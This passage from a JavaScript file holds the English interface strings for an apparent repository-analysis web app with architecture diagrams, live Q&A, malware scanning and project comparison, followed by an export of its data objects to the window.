    subtitle: 'Paste a GitHub URL. We scan, index, and open a Q&A assistant in parallel with the scan.',
    pasteRepo: 'Paste a GitHub URL — e.g. https://github.com/vercel/next.js',
    analyze: 'Analyze',
    cloud: 'Cloud LLM',
    local: 'Local LLM',
    feat: {
      arch:    { title: 'Architecture analysis', desc: 'AST + RAG produce block diagrams and sequence diagrams per use case.' },
      qa:      { title: 'Real-time Q&A',         desc: 'Ask while the pipeline is still running. Provisional answers upgrade as data lands.' },
      malware: { title: 'Malware detection',     desc: 'Heuristic + LLM confirm: dynamic eval, obfuscation, exfiltration, supply-chain.' },
      compare: { title: 'Compare projects',      desc: 'Place side-by-side with your repo — find patterns to borrow and divergence.' },
    },
    demo: { title: 'Pre-indexed demo repos', cta: 'Open session' },
    stages: { cloning: 'Cloning', parsing: 'Parsing AST', indexing: 'Indexing', summarizing: 'Summarizing', ready: 'Ready' },
    nav: { library: 'My projects', settings: 'Settings', docs: 'Docs' },
    common: {
      back: 'Back', open: 'Open', save: 'Save', cancel: 'Cancel', loading: 'Loading…', empty: 'Nothing here',
      newScan: 'New scan', cmdK: '⌘K to open Command', search: 'Search…', filter: 'Filter', sort: 'Sort',
      copy: 'Copy', download: 'Download', viewCode: 'View code', expand: 'Expand', collapse: 'Collapse',
      tree: 'File tree', assistant: 'AI Assistant', context: 'Context',
    },
    tabs: { overview: 'Overview', architecture: 'Architecture', flow: 'Flow', modules: 'Modules', security: 'Security', documentation: 'Documentation' },
    overview: {
      stats: { loc: 'Lines of code', files: 'Files', modules: 'Modules', contributors: 'Contributors' },
      langs: 'Languages', frameworks: 'Detected frameworks', readme: 'README.md',
    },
    arch: { compact: 'Compact', detailed: 'Detailed', legend: 'Layers', loading: 'Building architecture diagram…' },
    flow: { selectUseCase: 'Select use case', loading: 'Building sequence…' },
    mod: {
      header: { name: 'Module', purpose: 'Purpose', lang: 'Language', files: 'Files', fns: 'Functions', risk: 'Risk' },
      filterAll: 'All', search: 'Search modules…',
    },
    sec: {
      title: 'Security findings', confirmed: 'LLM Confirmed', heuristic: 'Heuristic', falsePositive: 'False positive',
      suggest: 'Suggest fix', why: 'Why', code: 'Relevant code', refs: 'References',
      patchPreview: 'Patch preview', applyPR: 'Open Pull Request', viewFile: 'View file',
      filterAll: 'All', empty: 'No risks detected.',
    },
    doc: { generated: 'Generated documentation', dlMd: 'Download .md', dlPdf: 'Download .pdf', pr: 'Open PR', view: 'View README' },
    chat: {
      placeholder: 'Ask about this repo… (⌘/ to focus)',
      provisional: 'Provisional — pipeline still running',
      scope: 'Current knowledge scope',
      finalSummary: '📋 Final session summary',
      finalSubtitle: 'Pipeline finished — I revisited the provisional answers and upgraded them.',
      fullAnalysis: 'Full analysis',
      contextLink: 'Linked to earlier conversation',
      provisionalAnswer: 'Provisional answer',
      upgradedAnswer: 'Upgraded answer',
      ctxRepo: 'This repo',
      ctxCompare: 'vs my project: acme/orders-api',
      send: 'Send',
      thinking: 'Thinking…',
      typeahead: 'Suggestions',
      noMessages: 'Ask anything to start exploring.',
    },
    cmd: {
      placeholder: 'Type a command or search…',
      sec: { recent: 'Recent', nav: 'Navigation', actions: 'Actions', repos: 'Repos' },
      empty: 'Nothing matches.',
    },
    library: {
      title: 'My projects',
      subtitle: 'Repos indexed in this workspace.',
      addNew: 'Add new repo',
      cols: { name: 'Repo', status: 'Status', loc: 'LOC', langs: 'Languages', last: 'Last scan' },
      filterStatus: 'Status',
      empty: 'No repos yet — paste a GitHub URL to begin.',
    },
    compare: {
      title: 'Compare repositories',
      pickA: 'Repo A', pickB: 'Repo B',
      shared: 'Shared dependencies', patterns: 'Patterns to borrow', divergence: 'Divergence',
      from: 'From', to: 'Apply to',
    },
    settings: {
      title: 'Settings',
      provider: 'LLM Provider',
      mode: 'Run mode',
      cloud: 'Cloud',
      local: 'Local',
      cloudDesc: 'Send prompts to a provider — fastest, latest models.',
      localDesc: 'Run locally (Ollama/llama.cpp). Code never leaves your machine. Needs decent GPU/CPU.',
      apiKey: 'API key',
      apiKeyPlaceholder: 'sk-…',
      embeds: 'Embeddings',
      lang: 'Interface language',
      theme: 'Theme',
      privacy: 'Privacy',
      privacyDesc: 'Source is analyzed in this workspace. We never log code externally.',
      saved: 'Saved',
    },
    final: {
      finishing: 'Composing final summary…',
    },
  },
};

window.DATA = {
  SCAN_DONE, SCAN_LIVE, FILE_TREE, MODULES, SECURITY_FINDINGS,
  ARCH_NODES, ARCH_EDGES, FLOWS, README_MD, GENERATED_DOC,
  CHAT_SEED_LIVE, CHAT_SEED_DONE, PIPELINE_STAGES, LIBRARY, COMPARE, QUICK_CHIPS,
};
window.I18N = I18N;
